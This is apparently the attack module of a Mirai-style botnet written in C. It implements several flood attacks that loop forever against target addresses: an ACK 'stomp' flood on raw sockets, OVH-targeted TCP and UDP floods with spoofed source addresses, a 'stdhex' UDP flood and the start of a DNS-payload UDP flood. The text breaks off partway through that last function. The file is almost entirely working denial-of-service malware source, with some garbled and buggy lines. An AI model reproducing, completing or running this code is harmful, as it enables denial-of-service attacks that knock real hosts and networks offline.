#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/if_ether.h>
#include <linux/tcp.h>
#include <errno.h>
#include <fcntl.h>
#include <string.h>

#include <stdint.h>
#include <poll.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/types.h>

#include "includes.h"
#include "attack.h"
#include "checksum.h"
#include "rand.h"
#include "util.h"
#include "table.h"
#include "protocol.h"

static unsigned long int Q[4096], c = 362436;

char *hexPayload = "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A";

static ipv4_t get_dns_resolver(void);

char random_hex() {
    char hexs[] = {'\x00', '\x01', '\x02', '\x03', '\x04', '\x05', '\x06', '\x07', '\x08', '\x09', '\x0a', '\x0b', '\x0c', '\x0d', '\x0e', '\x0f', '\x10', '\x11', '\x12', '\x13', '\x14', '\x15', '\x16', '\x17', '\x18', '\x19', '\x1a', '\x1b', '\x1c', '\x1d', '\x1e', '\x1f', '\x20', '\x21', '\x22', '\x23', '\x24', '\x25', '\x26', '\x27', '\x28', '\x29', '\x2a', '\x2b', '\x2c', '\x2d', '\x2e', '\x2f', '\x30', '\x31', '\x32', '\x33', '\x34', '\x35', '\x36', '\x37', '\x38', '\x39', '\x3a', '\x3b', '\x3c', '\x3d', '\x3e', '\x3f', '\x40', '\x41', '\x42', '\x43', '\x44', '\x45', '\x46', '\x47', '\x48', '\x49', '\x4a', '\x4b', '\x4c', '\x4d', '\x4e', '\x4f', '\x50', '\x51', '\x52', '\x53', '\x54', '\x55', '\x56', '\x57', '\x58', '\x59', '\x5a', '\x5b', '\x5c', '\x5d', '\x5e', '\x5f', '\x60', '\x61', '\x62', '\x63', '\x64', '\x65', '\x66', '\x67', '\x68', '\x69', '\x6a', '\x6b', '\x6c', '\x6d', '\x6e', '\x6f', '\x70', '\x71', '\x72', '\x73', '\x74', '\x75', '\x76', '\x77', '\x78', '\x79', '\x7a', '\x7b', '\x7c', '\x7d', '\x7e', '\x7f', '\x80', '\x81', '\x82', '\x83', '\x84', '\x85', '\x86', '\x87', '\x88', '\x89', '\x8a', '\x8b', '\x8c', '\x8d', '\x8e', '\x8f', '\x90', '\x91', '\x92', '\x93', '\x94', '\x95', '\x96', '\x97', '\x98', '\x99', '\x9a', '\x9b', '\x9c', '\x9d', '\x9e', '\x9f', '\xa0', '\xa1', '\xa2', '\xa3', '\xa4', '\xa5', '\xa6', '\xa7', '\xa8', '\xa9', '\xaa', '\xab', '\xac', '\xad', '\xae', '\xaf', '\xb0', '\xb1', '\xb2', '\xb3', '\xb4', '\xb5', '\xb6', '\xb7', '\xb8', '\xb9', '\xba', '\xbb', '\xbc', '\xbd', '\xbe', '\xbf', '\xc0', '\xc1', '\xc2', '\xc3', '\xc4', '\xc5', '\xc6', '\xc7', '\xc8', '\xc9', '\xca', '\xcb', '\xcc', '\xcd', '\xce', '\xcf', '\xd0', '\xd1', '\xd2', '\xd3', '\xd4', '\xd5', '\xd6', '\xd7', '\xd8', '\xd9', '\xda', '\xdb', '\xdc', '\xdd', '\xde', '\xdf', '\xe0', '\xe1', '\xe2', '\xe3', '\xe4', '\xe5', '\xe6', '\xe7', '\xe8', '\xe9', '\xea', '\xeb', '\xec', '\xed', '\xee', '\xef', '\xf0', '\xf1', '\xf2', '\xf3', '\xf4', '\xf5', '\xf6', '\xf7', '\xf8', '\xf9', '\xfa', '\xfb', '\xfc', '\xfd', '\xfe', '\xff'};

    int length = sizeof(hexs) / sizeof(hexs[0]);

    return rand() % (length + 1);
}

unsigned long int rand_cmwc(void)
{
        unsigned long long int t, a = 18782LL;
        static unsigned long int i = 4095;
        unsigned long int x, r = 0xfffffffe;
        i = (i + 1) & 4095;
        t = a * Q[i] + c;
        c = (t >> 32);
        x = t + c;
        if (x < c) {
                x++;
                c++;
        }
        return (Q[i] = r - x);
}

int randnum(int min_num, int max_num)
{
    int result = 0, low_num = 0, hi_num = 0;

    if (min_num < max_num)
    {
        low_num = min_num;
        hi_num = max_num + 1; // include max_num in output
    } else {
        low_num = max_num + 1; // include max_num in output
        hi_num = min_num;
    }

    result = (rand_cmwc() % (hi_num - low_num)) + low_num;
    return result;
}

unsigned short csum (unsigned short *buf, int count)
{
        register unsigned long sum = 0;
        while( count > 1 ) { sum += *buf++; count -= 2; }
        if(count > 0) { sum += *(unsigned char *)buf; }
        while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
        return (unsigned short)(~sum);
}

void attack_tcp_stomp(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, rfd;
    struct attack_stomp_data *stomp_data = calloc(targs_len, sizeof (struct attack_stomp_data));
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    BOOL urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, FALSE);
    BOOL ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, TRUE);
    BOOL psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, TRUE);
    BOOL rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, FALSE);
    BOOL syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, TRUE);
    BOOL fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, FALSE);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 768);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);

    // Set up receive socket
    if ((rfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
#ifdef DEBUG
        printf("Could not open raw socket!\n");
#endif
        return;
    }
    i = 1;
    if (setsockopt(rfd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL. Aborting\n");
#endif
        close(rfd);
        return;
    }

    // Retrieve all ACK/SEQ numbers
    for (i = 0; i < targs_len; i++)
    {
        int fd;
        struct sockaddr_in addr, recv_addr;
        socklen_t recv_addr_len;
        char pktbuf[256];
        time_t start_recv;

        stomp_setup_nums:

        if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
        {
#ifdef DEBUG
            printf("Failed to create socket!\n");
#endif
            continue;
        }

        // Set it in nonblocking mode
        fcntl(fd, F_SETFL, fcntl(fd, F_GETFL, 0) | O_NONBLOCK);
 
        // Set up address to connect to
        addr.sin_family = AF_INET;
        if (targs[i].netmask < 32)
            addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
        else
            addr.sin_addr.s_addr = targs[i].addr;
        if (dport == 0xffff)
            addr.sin_port = rand_next() & 0xffff;
        else
            addr.sin_port = htons(dport);

        // Actually connect, nonblocking
        connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
        start_recv = time(NULL);

        // Get info
        while (TRUE)
        {
            int ret;

            recv_addr_len = sizeof (struct sockaddr_in);
            ret = recvfrom(rfd, pktbuf, sizeof (pktbuf), MSG_NOSIGNAL, (struct sockaddr *)&recv_addr, &recv_addr_len);
            if (ret == -1)
            {
#ifdef DEBUG
                printf("Could not listen on raw socket!\n");
#endif
                return;
            }
            if (recv_addr.sin_addr.s_addr == addr.sin_addr.s_addr && ret > (sizeof (struct iphdr) + sizeof (struct tcphdr)))
            {
                struct tcphdr *tcph = (struct tcphdr *)(pktbuf + sizeof (struct iphdr));

                if (tcph->source == addr.sin_port)
                {
                    if (tcph->syn && tcph->ack)
                    {
                        struct iphdr *iph;
                        struct tcphdr *tcph;
                        char *payload;

                        stomp_data[i].addr = addr.sin_addr.s_addr;
                        stomp_data[i].seq = ntohl(tcph->seq);
                        stomp_data[i].ack_seq = ntohl(tcph->ack_seq);
                        stomp_data[i].sport = tcph->dest;
                        stomp_data[i].dport = addr.sin_port;
#ifdef DEBUG
                        printf("ACK Stomp got SYN+ACK!\n");
#endif
                        // Set up the packet
                        pkts[i] = malloc(sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len);
                        iph = (struct iphdr *)pkts[i];
                        tcph = (struct tcphdr *)(iph + 1);
                        payload = (char *)(tcph + 1);

                        iph->version = 4;
                        iph->ihl = 5;
                        iph->tos = ip_tos;
                        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len);
                        iph->id = htons(ip_ident);
                        iph->ttl = ip_ttl;
                        if (dont_frag)
                            iph->frag_off = htons(1 << 14);
                        iph->protocol = IPPROTO_TCP;
                        iph->saddr = LOCAL_ADDR;
                        iph->daddr = stomp_data[i].addr;

                        tcph->source = stomp_data[i].sport;
                        tcph->dest = stomp_data[i].dport;
                        tcph->seq = stomp_data[i].ack_seq;
                        tcph->ack_seq = stomp_data[i].seq;
                        tcph->doff = 8;
                        tcph->fin = TRUE;
                        tcph->ack = TRUE;
                        tcph->window = rand_next() & 0xffff;
                        tcph->urg = urg_fl;
                        tcph->ack = ack_fl;
                        tcph->psh = psh_fl;
                        tcph->rst = rst_fl;
                        tcph->syn = syn_fl;
                        tcph->fin = fin_fl;

                        rand_str(payload, data_len);
                        break;
                    }
                    else if (tcph->fin || tcph->rst)
                    {
                        close(fd);
                        goto stomp_setup_nums;
                    }
                }
            }

            if (time(NULL) - start_recv > 10)
            {
#ifdef DEBUG
                printf("Couldn't connect to host for ACK Stomp in time. Retrying\n");
#endif
                close(fd);
                goto stomp_setup_nums;
            }
        }
    }

    // Start spewing out traffic
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            char *data = (char *)(tcph + 1);

            if (ip_ident == 0xffff)
                iph->id = rand_next() & 0xffff;

            if (data_rand)
                rand_str(data, data_len);

            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));

            tcph->seq = htons(stomp_data[i].seq++);
            tcph->ack_seq = htons(stomp_data[i].ack_seq);
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + data_len), sizeof (struct tcphdr) + data_len);

            targs[i].sock_addr.sin_port = tcph->dest;
            sendto(rfd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
        }
#ifdef DEBUG
            break;
            if (errno != 0)
                printf("errno = %d\n", errno);
#endif
    }
}

void attack_method_ovhv2(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i;
    char **pkts = calloc(targs_len, sizeof (char *)); //
    int *fds = calloc(targs_len, sizeof (int)); //
    unsigned char *hexstring = malloc(1024);
    memset(hexstring, 0, 1024);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 1460);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    struct sockaddr_in bind_addr = {0};
    if (sport == 0xffff)
    {
        sport = rand_next();
    } else {
        sport = htons(sport);
    }
    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct udphdr *udph;
        char *data;
        pkts[i] = calloc(65535, sizeof (char)); //pkts[i]
        if (dport == 0xffff)
            targs[i].sock_addr.sin_port = rand_next();
        else
            targs[i].sock_addr.sin_port = htons(dport);
        if ((fds[i] = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
        {
            return;
        }
        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = sport;
        bind_addr.sin_addr.s_addr = 0;
        if (bind(fds[i], (struct sockaddr *)&bind_addr, sizeof (struct sockaddr_in)) == -1)
        {
            
        }
        if (targs[i].netmask < 32)
            targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
        if (connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in)) == -1)
        {
            
        }
    }
    unsigned int a = 0;
    while (TRUE)
    {   
        char * randhex[] = {
        "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff",
        "\xe2\x9e\xba\x28\xa1\xc2\xb0\x20\x20\x9c\xca\x96\x20\xcd\xa1\xc2\xb0\x29\xe2\x9e\xba\x28\xa1\xc2\xb0\x20\x20\x9c\xca\x96\x20\xcd\xa1\xc2\xb0\x29\xe2\x9e\xba\x28\xa1\xc2\xb0\x20\x20\x9c\xca\x96\x20\xcd\xa1\xc2\xb0\x29\xe2\x9e\xba\x28\xa1\xc2\xb0\x20\x20\x9c\xca\x96\x20\xcd\xa1\xc2\xb0\x29\xe2\x9e\xba\x28\xa1\xc2\xb0\x20\x20\x9c\xca\x96\x20\xcd\xa1\xc2\xb0\x29\xe2\x9e\xba\x28\xa1\xc2\xb0\x20\x20\x9c\xca\x96\x20\xcd\xa1\xc2\xb0\x29\xe2\x9e\xba\x28\xa1\xc2\xb0\x20\x20\x9c\xca\x96\x20\xcd\xa1\xc2\xb0\x29\xe2\x9e\xba\x28\xa1\xc2\xb0\x20\x20\x9c\xca\x96\x20\xcd\xa1\xc2\xb0\x29",
        "\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48",
        "\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf",
        "\x53\x65\x6c\x66\x20\x52\x65\x70\x20\x46\x75\x63\x6b\x69\x6e\x67\x20\x4e\x65\x54\x69\x53\x20\x61\x6e\x64\x20\x54\x68\x69\x73\x69\x74\x79\x20\x30\x6e\x20\x55\x72\x20\x46\x75\x43\x6b\x49\x6e\x47\x20\x46\x6f\x52\x65\x48\x65\x41\x64\x20\x57\x65\x20\x42\x69\x47\x20\x4c\x33\x33\x54\x20\x48\x61\x78\x45\x72\x53\x0a",
        pkts[i]
        };
        if (a >= 50)
        {           
            hexstring = randhex[rand() % (sizeof(randhex) / sizeof(char *))];
            for (i = 0; i < targs_len; i++)
            {                               
                //char *data = pkts[i];
                //if (data_rand)
                //rand_str(data, data_len);
                send(fds[i], hexstring, data_len, MSG_NOSIGNAL);
            }
            a = 0;
        }
        a++;       
    }   
}

void attack_method_ovh(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{

    int i, fd;
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    uint32_t seq = attack_get_opt_int(opts_len, opts, ATK_OPT_SEQRND, 0xffff);
    uint32_t ack = attack_get_opt_int(opts_len, opts, ATK_OPT_ACKRND, 0);
    BOOL urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, TRUE);
    BOOL ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, TRUE);
    BOOL psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, TRUE);
    BOOL rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, TRUE);
    BOOL syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, TRUE);
    BOOL fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, TRUE);
    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);


    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
        return;
    }
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
        close(fd);
        return;
    }
    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct tcphdr *tcph;
        uint8_t *opts;
        pkts[i] = calloc(128, sizeof (char));
        iph = (struct iphdr *)pkts[i];
        tcph = (struct tcphdr *)(iph + 1);
        opts = (uint8_t *)(tcph + 1);
        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr) + 20);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_TCP;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;
        tcph->source = htons(sport);
        tcph->dest = htons(dport);
        tcph->seq = htons(seq);
        tcph->doff = 10;
        tcph->urg = urg_fl;
        tcph->ack = ack_fl;
        tcph->psh = psh_fl;
        tcph->rst = rst_fl;
        tcph->syn = syn_fl;
        tcph->fin = fin_fl;
        *opts++ = PROTO_TCP_OPT_MSS;
        *opts++ = 4;
        *((uint16_t *)opts) = htons(1400 + (rand_next() & 0x0f));
        opts += sizeof (uint16_t);
        *opts++ = PROTO_TCP_OPT_SACK;
        *opts++ = 2;
        *opts++ = PROTO_TCP_OPT_TSVAL;
        *opts++ = 10;
        *((uint32_t *)opts) = rand_next();
        opts += sizeof (uint32_t);
        *((uint32_t *)opts) = 0;
        opts += sizeof (uint32_t);
        *opts++ = 1;
        *opts++ = PROTO_TCP_OPT_WSS;
        *opts++ = 3;
        *opts++ = 6;
    }
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
            if (source_ip == 0xffffffff)
                iph->saddr = rand_next();
            if (ip_ident == 0xffff)
                iph->id = rand_next() & 0xffff;
            if (sport == 0xffff)
                tcph->source = rand_next() & 0xffff;
            if (dport == 0xffff)
                tcph->dest = rand_next() & 0xffff;
            if (seq == 0xffff)
                tcph->seq = rand_next();
            if (ack == 0xffff)
                tcph->ack_seq = rand_next();
            if (urg_fl)
                tcph->urg_ptr = rand_next() & 0xffff;
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + 20), sizeof (struct tcphdr) + 20);
            targs[i].sock_addr.sin_port = tcph->dest;
            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + 20, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
        }
    }
}

void attack_method_stdhex(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts) // Shot by gay
{
    int i;
    char **pkts = calloc(targs_len, sizeof (char *));
    int *fds = calloc(targs_len, sizeof (int));
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 1458);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    struct sockaddr_in bind_addr = {0};
    if (sport == 0xffff)
    {
        sport = rand_next();
    } else {
        sport = htons(sport);
    }
    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct udphdr *udph;

        //char *data; 
        //char *data = size_array[rand() % (sizeof(size_array) +1 / sizeof(char *))];

        char *satuur_thicc[] = {"\x00","\x01","\x02","\x03","\x04","\x05","\x06","\x07","\x08","\x09","\x0a","\x0b","\x0c","\x0d","\x0e","\x0f","\x10","\x11","\x12","\x13","\x14","\x15","\x16","\x17","\x18","\x19","\x1a","\x1b","\x1c","\x1d","\x1e","\x1f","\x20","\x21","\x22","\x23","\x24","\x25","\x26","\x27","\x28","\x29","\x2a","\x2b","\x2c","\x2d","\x2e","\x2f","\x30","\x31","\x32","\x33","\x34","\x35","\x36","\x37","\x38","\x39","\x3a","\x3b","\x3c","\x3d","\x3e","\x3f","\x40","\x41","\x42","\x43","\x44","\x45","\x46","\x47","\x48","\x49","\x4a","\x4b","\x4c","\x4d","\x4e","\x4f","\x50","\x51","\x52","\x53","\x54","\x55","\x56","\x57","\x58","\x59","\x5a","\x5b","\x5c","\x5d","\x5e","\x5f","\x60","\x61","\x62","\x63","\x64","\x65","\x66","\x67","\x68","\x69","\x6a","\x6b","\x6c","\x6d","\x6e","\x6f","\x70","\x71","\x72","\x73","\x74","\x75","\x76","\x77","\x78","\x79","\x7a","\x7b","\x7c","\x7d","\x7e","\x7f","\x80","\x81","\x82","\x83","\x84","\x85","\x86","\x87","\x88","\x89","\x8a","\x8b","\x8c","\x8d","\x8e","\x8f","\x90","\x91","\x92","\x93","\x94","\x95","\x96","\x97","\x98","\x99","\x9a","\x9b","\x9c","\x9d","\x9e","\x9f","\xa0","\xa1","\xa2","\xa3","\xa4","\xa5","\xa6","\xa7","\xa8","\xa9","\xaa","\xab","\xac","\xad","\xae","\xaf","\xb0","\xb1","\xb2","\xb3","\xb4","\xb5","\xb6","\xb7","\xb8","\xb9","\xba","\xbb","\xbc","\xbd","\xbe","\xbf","\xc0","\xc1","\xc2","\xc3","\xc4","\xc5","\xc6","\xc7","\xc8","\xc9","\xca","\xcb","\xcc","\xcd","\xce","\xcf","\xd0","\xd1","\xd2","\xd3","\xd4","\xd5","\xd6","\xd7","\xd8","\xd9","\xda","\xdb","\xdc","\xdd","\xde","\xdf","\xe0","\xe1","\xe2","\xe3","\xe4","\xe5","\xe6","\xe7","\xe8","\xe9","\xea","\xeb","\xec","\xed","\xee","\xef","\xf0","\xf1","\xf2","\xf3","\xf4","\xf5","\xf6","\xf7","\xf8","\xf9","\xfa","\xfb","\xfc","\xfd","\xfe","\xff"};
        char *data = satuur_thicc[rand()%256];  

        pkts[i] = calloc(65535, sizeof (char));
        if (dport == 0xffff)
            targs[i].sock_addr.sin_port = rand_next();
        else
            targs[i].sock_addr.sin_port = htons(dport);
        if ((fds[i] = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
        {
            return;
        }
        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = sport;
        bind_addr.sin_addr.s_addr = 0;
        if (bind(fds[i], (struct sockaddr *)&bind_addr, sizeof (struct sockaddr_in)) == -1)
        {

        }
        if (targs[i].netmask < 32)
            targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
        if (connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in)) == -1)
        {

        }
    }
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *data = pkts[i];
            if (data_rand)
                rand_str(data, data_len);
            send(fds[i], data, data_len, MSG_NOSIGNAL);
        }
    }
}

void attack_method_nudp(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    char* strings[] = {
            "\x0D\x0A\x0D\x0A",
            random_hex() + random_hex() + "\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x01\x00\x01",
            random_hex() + random_hex() + "\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x05\x00\x01",
            "\x72\xFE\x1D\x13\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\x86\xA0\x00\x01\x97\x7C\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
